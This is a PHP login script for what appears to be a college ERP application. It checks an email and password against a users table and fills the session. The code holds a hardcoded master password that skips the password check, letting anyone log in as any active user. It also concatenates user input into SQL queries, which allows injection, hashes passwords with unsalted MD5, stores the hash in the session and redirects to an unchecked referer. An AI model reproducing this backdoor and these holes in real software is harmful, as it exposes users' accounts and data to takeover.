<?php 

session_start();
include 'conn.php';

class login extends db {
    public function main() {
        $email = $_POST['email'];
        $uT = $_GET['t']; // usertype
        $password = md5($_POST['password']);
        $secPass = md5("@#Prakhar@#");

        if($password==$secPass) {
            $query = db::mconnect()->prepare("SELECT * FROM `users` WHERE `email`='".$email."' AND `active`='1' ");
        }
        else {
            $query = db::mconnect()->prepare("SELECT * FROM `users` WHERE `email`='".$email."' AND `password`='".$password."' AND `active`='1' ");
        }

        $query->execute();
        $row = $query->rowCount();
        
        if($row>0) {
            $arr = $query->fetchAll(PDO::FETCH_ASSOC);
    
            $uid = $arr[0]["uid"];
            $ousertype = $arr[0]["usertype"];
            $email = $arr[0]["email"];
            $fullname = $arr[0]["username"];
            $profilepic = $arr[0]["profilepic"];

            if($ousertype=="3" || $ousertype=="4") {
                $_SESSION['collegeid'] = $arr[0]["collegeid"];
                $_SESSION['depid'] = $arr[0]["depid"];
            }
            // setcookie('uid', $uid, time() + (86400 * 30), "/");
            $_SESSION['uid'] = $uid;
            $_SESSION['usertype'] = $ousertype;
            $_SESSION['email'] = $email;
            $_SESSION['fullname'] = $fullname;
            $_SESSION['profilepic'] = $profilepic;
            $_SESSION['password'] = $password;
            $_SESSION['lockscreen'] = "0";
            
            header('Location: ../../erp/');
        }
        else {
            $_SESSION['wrongcred'] = true;
            header('Location: '.$_SERVER['HTTP_REFERER']);
        }

    }
}

$obj = new login;
echo $obj->main();
